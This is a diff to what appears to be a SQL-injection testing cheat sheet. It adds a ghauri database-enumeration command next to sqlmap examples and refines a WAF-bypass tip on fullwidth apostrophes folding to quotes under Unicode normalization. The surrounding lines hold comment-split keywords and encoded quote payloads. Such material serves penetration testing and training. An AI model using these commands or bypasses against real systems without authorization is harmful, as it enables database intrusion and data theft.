@@ -240,6 +240,9 @@ sqlmap -u "https://target.example/api/filter" --data="category=electronics&sort=
 
 # SQLMap with cookie auth
 sqlmap -u "https://target.example/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
+
+# ghauri (v1.4.3, 2025-10-04; github.com/r0oth3x49/ghauri) -- second engine when sqlmap misses or gets WAF-blocked
+ghauri -u "https://target.example/search?q=test" --dbs --batch
 ```
 
 **Burp Intruder payload list for column enumeration:**
@@ -300,7 +303,9 @@ SE/**/LECT username FR/**/OM users
 ```
 URL encode: %27 = '  %20 = space  %23 = #
 Double URL encode: %2527 = %27 = '
-Unicode: ʼ (U+02BC) as quote substitute
+Unicode (NFKC): ＇ (U+FF07 fullwidth apostrophe) folds to ' when the app normalizes AFTER the WAF/escape step
+  (U+02BC ʼ has no compatibility decomposition and does NOT fold; test the fold with a probe pair first)
+  Ref: Ryan & Isabella Barnett, "Lost in Translation: Exploiting Unicode Normalization" (PortSwigger Top 10 2025 #4)
 HTML entity (in reflected contexts): &#39;
 ```
 
